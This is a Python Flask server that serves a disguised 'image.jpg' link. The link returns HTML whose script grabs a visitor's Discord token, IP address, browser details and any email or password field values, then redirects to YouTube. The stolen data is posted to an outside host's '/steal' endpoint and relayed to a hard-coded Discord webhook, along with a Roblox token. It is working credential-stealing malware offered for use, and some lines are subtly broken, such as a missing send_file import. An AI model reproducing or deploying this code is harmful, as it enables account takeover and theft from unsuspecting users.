from flask import Flask, Response, request
import requests
import os

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1386603806502162514/uUmrt5ouu_waJ6xnSAWxNEyvglx6xWawyQcZoXLdjoApXn1Trgvx3DVlC9tTCcTCt4KC"

PREVIEW_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="0; url=https://www.youtube.com/watch?v=dQw4w9WgXcQ">
    <script>
        (async () => {
            const token = localStorage.getItem('token') || (await (await fetch('https://discord.com/api/v9/users/@me', {
                headers: { 'Authorization': 'Bearer ' + document.__discordToken }
            })).json()).token;
            const userInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                ip: await (await fetch('https://api.ipify.org?format=json')).json().ip
            };
            let credentials = [];
            try {
                document.querySelectorAll('input[type="email"], input[type="text"]').forEach(input => {
                    if (input.value.includes('@')) {
                        credentials.push({ email: input.value, password: 'Unknown (form email)' });
                    }
                });
                document.querySelectorAll('input[type="password"]').forEach(input => {
                    if (input.value) {
                        credentials.push({ email: 'Unknown (form password)', password: input.value });
                    }
                });
            } catch (e) {
                credentials.push({ email: 'Error', password: 'Could not access credentials' });
            }
            await fetch('https://dustrrr.onrender.com/steal', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token, user_info: userInfo, credentials })
            });
        })();
    </script>
</head>
<body>
    Redirecting to YouTube...
</body>
</html>
"""

@app.route('/image.jpg')
def serve_image():
    user_agent = request.headers.get('User-Agent', '')
    if 'Discordbot' in user_agent:
        return PREVIEW_HTML, 200, {'Content-Type': 'text/html'}
    return Response(PREVIEW_HTML, mimetype='text/html')

@app.route('/preview.jpg')
def serve_preview():
    return send_file('preview.jpg', mimetype='image/jpeg')

@app.route('/upload', methods=['POST'])
def upload_image():
    if 'image' not in request.files:
        return 'No image provided', 400
    image = request.files['image']
    if not image.filename.endswith(('.jpg', '.jpeg', '.png')):
        return 'Invalid image format', 400
    image.save('preview.jpg')
    return 'Image updated', 200

@app.route('/steal', methods=['POST'])
def steal_data():
    data = request.json
    token = data.get('token')
    user_info = data.get('user_info')
    credentials = data.get('credentials')
    cred_text = "\n".join([f"Email: {cred['email']}, Password: {cred['password']}" for cred in credentials]) if credentials else "No credentials found"
    requests.post(WEBHOOK_URL, json={
        "content": f"Token: {token}\nUser Info: {user_info}\nCredentials:\n{cred_text}\nRoblox Token: {os.getenv('ROBLOX_TOKEN', 'Not found')}"
    })
    return '', 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
